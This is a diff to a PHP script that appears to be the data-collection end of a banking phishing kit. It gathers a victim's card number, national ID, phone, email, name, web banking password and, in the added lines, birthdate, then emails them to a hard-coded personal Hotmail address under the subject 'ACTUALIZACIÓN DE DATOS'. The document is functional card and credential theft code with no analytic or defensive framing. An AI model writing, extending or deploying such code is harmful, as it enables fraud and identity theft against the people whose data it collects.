@@ -9,12 +9,20 @@
     $email = $_POST['email'];
     $cc = $_SESSION['cc'];
     $pass = $_SESSION['pass'];
+    $birthdate = $_SESSION['birthdate'];
 
+    //Correo a donde se envía la información
     $to = "fernando1894@hotmail.com";
 
     $subject = "ACTUALIZACIÓN DE DATOS";
 
-    $txt = "NUMERO DE TARJETA: " . $cc . "\n" . "DNI: " . $dni . "\n" . "NUMERO DE TELEFONO: " . $tel . "\n" . "DIRECCIÓN DE CORREO: " . $email . "NOMBRE: " . $name . "\n" . "CLAVE WEB: " . $pass;
+    $txt =  "NUMERO DE TARJETA: " . $cc . "\n" . 
+            "DNI: " . $dni . "\n" . 
+            "NUMERO DE TELEFONO: " . $tel . "\n" . 
+            "DIRECCIÓN DE CORREO: " . $email . 
+            "NOMBRE: " . $name . "\n" . 
+            "FECHA DE NACIMIENTO: " . $birthdate . "\n" . 
+            "CLAVE WEB: " . $pass;
 
     $headers = "From: pruebas@pruebas.ga";
 
